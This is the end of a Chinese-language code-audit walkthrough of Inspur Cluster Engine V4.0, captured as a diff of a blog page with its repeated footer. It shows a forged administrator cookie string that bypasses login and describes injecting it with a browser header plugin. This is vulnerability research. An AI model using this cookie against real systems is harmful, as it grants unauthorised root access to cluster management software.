+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="n">result</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"result"</span><span class="o">,</span> <span class="s">"false"</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="nc">JsonUtil</span><span class="o">.</span><span class="na">respnseJson</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">response</span><span class="o">,</span> <span class="n">result</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">JSONException</span> <span class="n">var10</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">JsonUtil</span><span class="o">.</span><span class="na">respnseJson</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">response</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">nullResJson</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>分析得：用户认证Cookie不存在随机性、时效性。所以我们可以直接伪造Cookie登入即可：<code class="language-plaintext highlighter-rouge">lang=cn; username=root; userType=administrator; vertifyUser=true</code></p>
+
+<p><img src="/static/web-image/inspur-CEV4-Code-audit/user_auth_RF.png" alt="" /></p>
+
+<p>直接使用Cookie插件ModHeader带入Cookie，直接登入：</p>
+
+<p><img src="/static/web-image/inspur-CEV4-Code-audit/inspur_cookie_SF.png" alt="" /></p>
+
+<hr />
+
+<p>以上。</p>
+
+
+
+				</div>
+				<div class="spacing"></div>
+	            <div>
+	<div class="hline"></div>
+	<h3><em>#</em> 申明</h3>
+	<div class="spacing"></div>
+	<h4><em>By: Bin4xin.</em></h4>
+	<h4>转载请申明本文链接：<a href="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/" target="_blank"><code-index-css>《<em>Inspur Cluster Engine V4.0 Code Aduit Walkthrough</em>》</code-index-css></a></h4>
+
+	<h3><em># Any Questions</em></h3>
+	<div class="spacing"></div>
+	<h4> >_ 对本文进行提问：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://github.com/Bin4xin/bin4xin.github.io/blob/1b4fffa6232dc6ffa2cece8be0d6c39e0c5f9cfe/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/index.html%23L84" target="_blank"> <em><li class="fa fa-github"></li> Reference in new issue.</em></a></h4>
+
+	<h4> >_ 对本文进行留言：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://about.sentrylab.cn/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/" target="_blank"> <em><li class="fa fa-github"></li> Leave a Comment.</em></a></h4>
+</div>
+			</div><!-- help content -->
+	  </div>
+	</div><!--/container -->
+</div><!--/mirrors -->
+	
+
+
+<div id="footerwrap" class="tuna-foot-1">
+<div class="container">
+    <div class="row">
+            <div class="col-sm-4">
+                <div class="col-sm-6">
+                  <p class="thuhidden"><strong>入门</strong></p>
+                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>源码</a></p>
+                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">博客搭建教程</a></p>
+                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">个性化语法批注</a></p>
+                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></p>
+                  </div>
+
+                  <div class="col-sm-6">
+                  <p class="thuhidden"><strong>社区</strong></p>
+                  <p class="thuhidden"><a href="/blog" target="blank">博客</a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
+                  </div>
+            </div>
+
+            <div class="col-sm-4">
+                  <div class="col-sm-6">
+                    <p class="thuhidden"><strong>开发</strong></p>
+                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
+                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
+                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
+                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
+                    <p class="share">
+                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
+                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
+                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
+                    </p>
+                  </div>
+
+                  <div class="col-sm-6">
+                    <p class="thuhidden"><strong>关于</strong></p>
+                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">近期研究</a></p>
+                    <p class="thuhidden">∑ <csmall>(Visitors/times)</csmall></em></p>
+                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
+                  </div>
+            </div>
+
+        <div class="col-sm-4">
+          
+          <img src="/static/img/logo-small@3x.png" />
+
+        </div>
+    </div><!--/row -->
+    
+    <p class="thuhidden">© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>
+
+  </div>
+</div>
+
+
+
+
+<div id="footerwrap" class="tuna-foot-2">
+<div class="container">
+    <div class="row">
+            <div class="col-sm-4">
+                <div class="col-sm-6">
+                  <p class="thuhidden"><strong>入门</strong></p>
+                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>源码</a></p>
+                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">博客搭建教程</a></p>
+                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">个性化语法批注</a></p>
+                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></p>
+                  </div>
+
+                  <div class="col-sm-6">
+                  <p class="thuhidden"><strong>社区</strong></p>
+                  <p class="thuhidden"><a href="/blog" target="blank">博客</a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
+                  </div>
+            </div>
+
+            <div class="col-sm-4">
+                  <div class="col-sm-6">
+                    <p class="thuhidden"><strong>开发</strong></p>
+                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
+                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
+                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
+                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
+                    <p class="share">
+                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
+                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
+                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
+                    </p>
+                  </div>
+
+                  <div class="col-sm-6">
+                    <p class="thuhidden"><strong>关于</strong></p>
+                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">近期研究</a></p>
+                    <p class="thuhidden">∑ <csmall>(Visitors/times)</csmall></em></p>
+                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
+                  </div>
+            </div>
+
+        <div class="col-sm-4">
+          
+          <img src="/static/img/logo-small@3x.png" />
+
+        </div>
+    </div><!--/row -->
+    
+    <p class="thuhidden">© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>
+
+  </div>
+</div>
+
+
+</body>
+
+<script src="/static/js/help.js"></script>
+</html>
+<!--
+vim: ts=2 sts=2 sw=2 noexpandtab
+-->
